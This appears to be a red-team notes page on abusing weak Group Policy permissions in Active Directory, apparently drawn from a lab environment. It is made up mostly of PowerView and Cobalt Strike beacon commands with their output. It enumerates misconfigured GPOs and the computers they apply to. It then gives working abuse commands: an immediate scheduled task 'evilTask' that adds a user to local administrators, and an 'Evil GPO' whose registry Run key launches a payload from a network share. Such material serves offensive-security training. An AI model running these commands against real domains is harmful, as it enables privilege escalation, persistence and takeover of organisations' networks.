```
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse
![[image 12.avif]]We know the above ObjectDN from the above screenshot is referring to the New Group Policy Object GPO since the ObjectDN points to CN=Policies and also the CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}

If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![[image 13.avif]]We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:

```
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![[image 14.avif]]

## Policies Applied to a Given Computer

```
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![[image 20.png]]

## OUs with a Given Policy Applied
```
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![[image 21.png]]

## Abusing Weak GPO Permissions

One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:

```
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![[image 15.avif]]
## Force Policy Update

ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
![[image 22.png]]


## Check if we can create and link GPO
  This shows that members of the "Developers" group can create new GPOs.
```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

DEV\Developers
```
This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

ObjectDN              : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : ReadProperty, WriteProperty
ObjectAceType         : GP-Link
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

```
powershell New-GPO -Name "Evil GPO"

beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
```